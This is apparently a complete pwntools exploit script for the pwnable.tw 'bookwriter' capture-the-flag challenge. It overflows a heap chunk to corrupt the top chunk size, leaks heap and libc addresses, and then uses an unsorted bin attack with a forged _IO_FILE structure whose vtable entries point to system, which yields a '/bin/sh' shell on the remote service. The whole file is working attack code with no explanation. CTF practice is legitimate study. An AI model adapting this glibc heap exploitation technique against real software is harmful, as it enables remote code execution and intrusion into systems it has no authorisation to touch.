from pwn import *

p = remote('chall.pwnable.tw',10304)
#p = process('./bookwriter',env = {'LD_PRELOAD': './libc_64.so.6'})
libc = ELF('./libc_64.so.6')
context.log_level = 'debug'
def author(name):
        p.sendline(name)
def add(size,content):
        p.sendlineafter('Your choice :',str(1))
        p.sendafter('Size of page :',str(size))
        p.sendafter('Content :',content)
def view(index):
        p.sendlineafter('Your choice :',str(2))
        p.sendafter('Index of page :',str(index))
def edit(index,content):
        p.sendlineafter('Your choice :',str(3))
        p.sendafter('Index of page :',str(index))
        p.sendafter('Content:',content)
def info():
        p.sendlineafter('Your choice :',str(4))
#gdb.attach(p,'''
#b* 0x400c04'''
#)
author('a'*0x40)
add(0x18,'a'*0x18)      #index 0
edit(0,'a'*0x18)
edit(0,'a'*0x18+'\xe1\x0f\x00')
add(0x1000,'c'*8)       #index 1
add(0x40,'c'*8)         #index 2
def lead_heap():
        info()
        p.recvuntil('a'*0x40)
        return p.recvuntil('\n')[:-1].ljust(8,'\x00')
heap_add = u64(lead_heap()) - 0x10
p.sendlineafter('no:0',str(0))
log.info("Heap Address:" + hex(heap_add))
def lead_libc():
        view(2)
        p.recvuntil('cccccccc')
        return p.recvuntil('\n----------------------')[:-23].ljust(8,'\x00')
main_arena_88 = u64(lead_libc())
libc.address = main_arena_88 - 0x3c4188
log.info("Main_Arena+88:" + hex(main_arena_88))
log.info("Libc base address:" + hex(libc.address))
for i in range(5):
        add(0x10,str(i)*8)              #index 3,4,5,6,7
edit(0,'\x00')                          #size index 0 = 0
add(0x10,'c'*8)                         #size index 0 = address index 8

#IO_file_plus
payload  = '\x00'*0x120
payload += '/bin/sh\x00'+p64(0x61)
payload += '\x00'*8+p64(libc.sym['_IO_list_all']-0x10) #fd, bk unsortedbin atk
payload += p64(2) + p64(3)              #write_base < write_ptr
payload = payload.ljust(0x120+0xc0,'\x00') #offset is 0xc0 (top to variable _mode)
payload += p64(0)                       #mode <= 0
payload = payload.ljust(0x120+0xd8,'\x00') #offset is 0xd8 (top to _vtable)
payload += p64(heap_add+0x10+0x120+0xd8+0x10) #_vtable -> address(heap_add + [meta_date first chunk] 
                                              #                   + [0x120 token of top payload] + 0xd8
                                              #                   + [0x10 address data struct]
#_IO_jump_t
payload += 5*p64(libc.sym['system'])
#pause()
edit(0,payload)
edit(0,'\x00')
#pause()
add(0x10,'A'*8)
p.interactive()
